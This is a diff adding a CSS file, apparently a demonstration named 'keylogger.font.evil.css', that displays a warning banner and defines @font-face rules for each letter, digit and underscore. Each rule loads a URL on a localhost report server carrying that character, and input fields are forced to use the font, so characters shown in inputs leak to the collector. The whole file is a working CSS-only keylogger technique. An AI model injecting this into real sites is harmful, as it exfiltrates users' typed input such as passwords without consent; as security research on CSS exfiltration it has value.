@@ -1,0 +1,396 @@
+
+body::before {
+    content: "You loaded keylogger.font.evil.css!";
+    position: fixed;
+    top: 0;
+    left: 0;
+    font-size: 12px;
+    font-family: "Courier New", serif;
+    background-color: rgba(255, 12, 82, 0.75);
+    width: 100%;
+    text-align: center;
+    color: white;
+    z-index: 999;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=a), local("Courier New");
+    unicode-range: U+61;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=b), local("Courier New");
+    unicode-range: U+62;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=c), local("Courier New");
+    unicode-range: U+63;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=d), local("Courier New");
+    unicode-range: U+64;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=e), local("Courier New");
+    unicode-range: U+65;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=f), local("Courier New");
+    unicode-range: U+66;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=g), local("Courier New");
+    unicode-range: U+67;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=h), local("Courier New");
+    unicode-range: U+68;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=i), local("Courier New");
+    unicode-range: U+69;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=j), local("Courier New");
+    unicode-range: U+6a;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=k), local("Courier New");
+    unicode-range: U+6b;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=l), local("Courier New");
+    unicode-range: U+6c;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=m), local("Courier New");
+    unicode-range: U+6d;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=n), local("Courier New");
+    unicode-range: U+6e;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=o), local("Courier New");
+    unicode-range: U+6f;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=p), local("Courier New");
+    unicode-range: U+70;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=q), local("Courier New");
+    unicode-range: U+71;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=r), local("Courier New");
+    unicode-range: U+72;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=s), local("Courier New");
+    unicode-range: U+73;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=t), local("Courier New");
+    unicode-range: U+74;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=u), local("Courier New");
+    unicode-range: U+75;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=v), local("Courier New");
+    unicode-range: U+76;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=w), local("Courier New");
+    unicode-range: U+77;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=x), local("Courier New");
+    unicode-range: U+78;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=y), local("Courier New");
+    unicode-range: U+79;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=z), local("Courier New");
+    unicode-range: U+7a;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=A), local("Courier New");
+    unicode-range: U+41;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=B), local("Courier New");
+    unicode-range: U+42;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=C), local("Courier New");
+    unicode-range: U+43;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=D), local("Courier New");
+    unicode-range: U+44;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=E), local("Courier New");
+    unicode-range: U+45;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=F), local("Courier New");
+    unicode-range: U+46;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=G), local("Courier New");
+    unicode-range: U+47;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=H), local("Courier New");
+    unicode-range: U+48;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=I), local("Courier New");
+    unicode-range: U+49;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=J), local("Courier New");
+    unicode-range: U+4a;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=K), local("Courier New");
+    unicode-range: U+4b;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=L), local("Courier New");
+    unicode-range: U+4c;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=M), local("Courier New");
+    unicode-range: U+4d;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=N), local("Courier New");
+    unicode-range: U+4e;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=O), local("Courier New");
+    unicode-range: U+4f;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=P), local("Courier New");
+    unicode-range: U+50;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=Q), local("Courier New");
+    unicode-range: U+51;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=R), local("Courier New");
+    unicode-range: U+52;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=S), local("Courier New");
+    unicode-range: U+53;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=T), local("Courier New");
+    unicode-range: U+54;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=U), local("Courier New");
+    unicode-range: U+55;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=V), local("Courier New");
+    unicode-range: U+56;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=W), local("Courier New");
+    unicode-range: U+57;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=X), local("Courier New");
+    unicode-range: U+58;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=Y), local("Courier New");
+    unicode-range: U+59;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=Z), local("Courier New");
+    unicode-range: U+5a;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=1), local("Courier New");
+    unicode-range: U+31;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=2), local("Courier New");
+    unicode-range: U+32;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=3), local("Courier New");
+    unicode-range: U+33;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=4), local("Courier New");
+    unicode-range: U+34;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=5), local("Courier New");
+    unicode-range: U+35;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=6), local("Courier New");
+    unicode-range: U+36;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=7), local("Courier New");
+    unicode-range: U+37;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=8), local("Courier New");
+    unicode-range: U+38;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=9), local("Courier New");
+    unicode-range: U+39;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=0), local("Courier New");
+    unicode-range: U+30;
+}
+
+@font-face {
+    font-family: x;
+    src: url(http://localhost:3000/report?site=keylogger.font&payload=_), local("Courier New");
+    unicode-range: U+5f;
+}
+
+input {
+    font-family: x, sans-serif !important;
+}
